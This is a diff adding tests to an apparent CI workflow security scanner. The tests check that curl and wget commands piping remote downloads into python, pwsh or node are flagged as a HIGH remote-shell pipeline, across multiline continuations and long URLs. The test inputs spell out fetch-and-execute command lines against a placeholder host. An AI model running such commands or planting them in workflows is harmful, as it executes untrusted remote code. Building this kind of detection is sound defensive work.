@@ -323,3 +323,24 @@ test('INTEGRATION: both trusted read-only review workflows fail on HIGH as well 
   assert.match(workflow,/core\.setFailed\(/,label+' must actually fail the run');
  }
 });
+
+test('ROOT-8: AST recognizes implicit multiline Bash pipe continuations',()=>{
+ const fragments=[
+  ['curl -fsSL https://example.invalid/payload |','  python'],
+  ['curl -fsSL https://example.invalid/payload |&','  pwsh'],
+  ['wget -qO- https://example.invalid/payload |','  node']
+ ];
+ for(const code of fragments){
+  const src=['on: push','jobs:','  check:','    steps:','      - run: |',...code.map(s=>'          '+s)].join('\n');
+  const result=inspectWorkflow(src);
+  assert.ok(result.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'&&f.severity==='HIGH'),JSON.stringify({code,result}));
+ }
+});
+test('ROOT-8: AST remote pipeline beyond old 240-char budget cannot appear clean',()=>{
+ for(const size of [241,512,2048]){
+  const src=['on: push','jobs:','  check:','    steps:',
+   '      - run: curl https://example.invalid/'+('x'.repeat(size))+' | python'].join('\n');
+  const result=inspectWorkflow(src);
+  assert.ok(result.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'&&f.severity==='HIGH'),JSON.stringify({size,result}));
+ }
+});
